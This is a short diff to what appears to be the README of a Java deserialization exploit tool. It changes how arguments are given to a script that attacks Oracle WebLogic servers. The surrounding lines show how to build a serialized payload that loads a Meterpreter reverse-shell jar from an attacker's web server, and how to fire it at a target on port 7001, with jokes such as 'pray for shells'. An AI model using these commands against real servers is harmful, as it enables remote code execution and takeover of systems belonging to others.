@@ -76,5 +76,5 @@ Generate your malicious **servlet** ->
 ` java -jar exserial.jar ClassInject "http://yourwebserver:port/my_reverse_meterpreter.jar" "metasploit.Payload" > exploit.ser`
 
 Fire away and **pray for shells** ->
-` python scripts/weblogic.py http://somepoorsod:7001 exploit.ser`
+` python scripts/weblogic.py http://somepoorsod 7001 exploit.ser`
 
